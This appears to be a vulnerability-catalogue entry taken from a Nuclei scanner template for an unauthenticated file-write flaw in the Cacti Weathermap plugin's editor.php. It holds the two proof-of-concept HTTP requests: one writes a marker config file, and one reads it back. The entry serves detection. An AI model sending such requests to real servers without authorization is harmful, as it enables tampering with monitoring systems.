# Vulnerability: Cacti Weathermap File Write
**Classification:** INJECTION
**Source:** Nuclei Template (`cacti-weathermap-file-write.yaml`)

## Description
Cacti Weathermap (a plugin for Cacti, an open-source network monitoring and graphing tool) is vulnerable to file write.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/plugins/weathermap/editor.php?plug=0&mapname=poc.conf&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7
GET {{BaseURL}}/plugins/weathermap/configs/poc.conf
```

